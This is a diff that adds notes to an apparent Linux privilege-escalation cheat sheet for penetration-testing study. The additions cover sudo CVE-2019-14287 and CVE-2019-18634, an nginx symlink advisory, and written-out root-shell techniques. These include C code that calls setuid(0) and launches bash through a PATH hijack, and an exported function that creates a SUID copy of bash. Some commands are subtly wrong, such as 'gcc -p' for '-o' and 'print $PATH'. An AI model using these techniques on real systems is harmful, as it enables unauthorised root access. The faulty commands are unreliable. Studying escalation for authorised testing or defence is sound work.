@@ -255,6 +255,17 @@ sudo -u <USERNAME> <PROGRAM>
 #### If a program is found check gtfobins
 - https://gtfobins.github.io/
 
+#### Sudo CVE-2019-14287
+- Check for may run the following commands ```(ALL, !root) NOPASSWD: /bin/bash```
+- https://www.exploit-db.com/exploits/47502
+  
+#### Sudo buffer overflow CVE-2019-18634
+- https://github.com/saleemrashid/sudo-cve-2019-18634
+- Check if present pwfeedback by checking if ```*****``` is there when typing password.
+```
+su <USER>
+```
+  
 ### Apache2 trick
 apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand. 
 ```
@@ -413,15 +424,40 @@ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
 
 #### Run SUID Executable
 
+### Binary symlinks
+- https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+  
 ### PATH environment variable
 The PATH environment variable contains a list of directories where the shell should try to find programs. If a program tries to execute another program, but only specifies the program name, rather than its full (absolute) path, the shell will search the PATH directories until it is found. Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.
 
 If a program tries to execute another program, the name of that program is likely embedded in the executable file as a string. We can run strings on the executable file to find strings of characters. We can also use strace to see how the program is executing. Another program called ltrace may also be of use.
 
+#### Check what the program does
 ```
 strings <PATH TO FILE>
 strace -v -f -e execve <COMMAND> 2>&1 | grep exec
 ltrace <COMMAND>
+```
+
+#### Check path variable
+```
+print $PATH
+```
+  
+#### Abuse PATH variable
+```
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash");return 0;}' > /tmp/service.c
+gcc /tmp/service.c -p /tmp/service
+export PATH=/tmp:$PATH
+```
+
+#### Wrong path / change the file
+It is possible the programs uses something we can change, for example in the ```/usr/local/``` directory. For example service:
+
+```
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f /usr/sbin/service
+RUN THE SUID
 ```
 
 ### Abusing shell features #1
